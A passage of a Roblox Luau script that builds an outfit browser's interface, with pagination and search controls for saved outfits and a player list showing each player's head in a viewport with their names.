    if totalPages < 1 then totalPages = 1 end
    currentPage = 1
    
    renderSavedPage()
end

-- ==========================================
-- 🎛️ PAGINATION LOGIC CONTROLS
-- ==========================================
BtnFirst.MouseButton1Click:Connect(function() if currentPage > 1 then currentPage = 1 renderSavedPage() end end)
BtnPrev.MouseButton1Click:Connect(function() if currentPage > 1 then currentPage = currentPage - 1 renderSavedPage() end end)
BtnNext.MouseButton1Click:Connect(function() if currentPage < totalPages then currentPage = currentPage + 1 renderSavedPage() end end)
BtnLast.MouseButton1Click:Connect(function() if currentPage < totalPages then currentPage = totalPages renderSavedPage() end end)

BtnCustom.MouseButton1Click:Connect(function()
    customOnly = not customOnly
    BtnCustom.BackgroundColor3 = customOnly and Color3.fromRGB(40, 170, 90) or Color3.fromRGB(40, 40, 50)
    populateSavedOutfits()
end)

SavedSearchBox:GetPropertyChangedSignal("Text"):Connect(function()
    searchQuery = string.lower(SavedSearchBox.Text)
    if searchQuery == "all" then searchQuery = "" end 
    populateSavedOutfits()
end)

-- ==========================================
-- PLAYER LIST BUILDER
-- ==========================================
populatePlayerList = function()
    for _, child in pairs(PlayerScroll:GetChildren()) do if child:IsA("TextButton") then child:Destroy() end end

    local players = Players:GetPlayers()
    for idx, player in ipairs(players) do
        local PlayerBtn = Instance.new("TextButton", PlayerScroll)
        PlayerBtn.BackgroundColor3, PlayerBtn.BorderSizePixel, PlayerBtn.Text = Color3.fromRGB(24, 24, 30), 0, ""
        Instance.new("UICorner", PlayerBtn).CornerRadius = UDim.new(0, 8)

        local SmallViewport = Instance.new("ViewportFrame", PlayerBtn)
        SmallViewport.Name, SmallViewport.BackgroundColor3, SmallViewport.BorderSizePixel = "ViewportFrame", Color3.fromRGB(15, 15, 18), 0
        Instance.new("UICorner", SmallViewport).CornerRadius = UDim.new(0, 6)

        local DisplayName = Instance.new("TextLabel", PlayerBtn)
        DisplayName.Name, DisplayName.Text, DisplayName.TextColor3 = "DisplayName", player.DisplayName, Color3.fromRGB(255, 255, 255)
        DisplayName.Font, DisplayName.TextSize, DisplayName.TextTruncate, DisplayName.BackgroundTransparency = Enum.Font.SourceSansBold, 12, Enum.TextTruncate.AtEnd, 1

        local Username = Instance.new("TextLabel", PlayerBtn)
        Username.Name, Username.Text, Username.TextColor3 = "Username", "@" .. player.Name, Color3.fromRGB(150, 150, 150)
        Username.Font, Username.TextSize, Username.TextTruncate, Username.BackgroundTransparency = Enum.Font.SourceSans, 11, Enum.TextTruncate.AtEnd, 1
        
        if isGridMode then
            SmallViewport.Size, SmallViewport.Position = UDim2.new(0, 60, 0, 60), UDim2.new(0.5, -30, 0, 5)
            DisplayName.Size, DisplayName.Position, DisplayName.TextXAlignment = UDim2.new(1, -4, 0, 15), UDim2.new(0, 2, 0, 70), Enum.TextXAlignment.Center
            Username.Size, Username.Position, Username.TextXAlignment = UDim2.new(1, -4, 0, 15), UDim2.new(0, 2, 0, 85), Enum.TextXAlignment.Center
        else
            SmallViewport.Size, SmallViewport.Position = UDim2.new(0, 40, 0, 40), UDim2.new(0, 5, 0, 5)
            DisplayName.Size, DisplayName.Position, DisplayName.TextXAlignment = UDim2.new(1, -60, 0, 20), UDim2.new(0, 55, 0, 5), Enum.TextXAlignment.Left
            Username.Size, Username.Position, Username.TextXAlignment = UDim2.new(1, -60, 0, 20), UDim2.new(0, 55, 0, 25), Enum.TextXAlignment.Left
        end

        local cachedDescription = nil
        task.spawn(function()
            local char = player.Character or player.CharacterAdded:Wait()
            if not player:HasAppearanceLoaded() then player.CharacterAppearanceLoaded:Wait() end

            local hum = char:WaitForChild("Humanoid", 5)
            if hum then pcall(function() cachedDescription = hum:GetAppliedDescription() end) end

            local oldArchivable = char.Archivable
            char.Archivable = true
            local headClone = char:Clone()
            char.Archivable = oldArchivable

            if headClone then
                headClone.Parent = SmallViewport
                local camera = Instance.new("Camera", SmallViewport)
                local head = headClone:FindFirstChild("Head")
                if head then
                    camera.CFrame = head.CFrame * CFrame.new(0, 0, -2.5) * CFrame.Angles(0, math.pi, 0)
                    camera.Focus = head.CFrame
                end
                SmallViewport.CurrentCamera = camera
            end
        end)
        
        PlayerBtn.MouseButton1Click:Connect(function() 
            isViewingSaved = false 
            deepScanPlayerOutfit(player, cachedDescription) 
        end)
        
        if idx % 10 == 0 then task.wait() end 
    end
    
    task.delay(0.2, function()
        if PlayerGrid and PlayerScroll then PlayerScroll.CanvasSize = UDim2.new(0, 0, 0, PlayerGrid.AbsoluteContentSize.Y + 50) end
    end)
end

RefreshBtn.MouseButton1Click:Connect(populatePlayerList)
populatePlayerList()
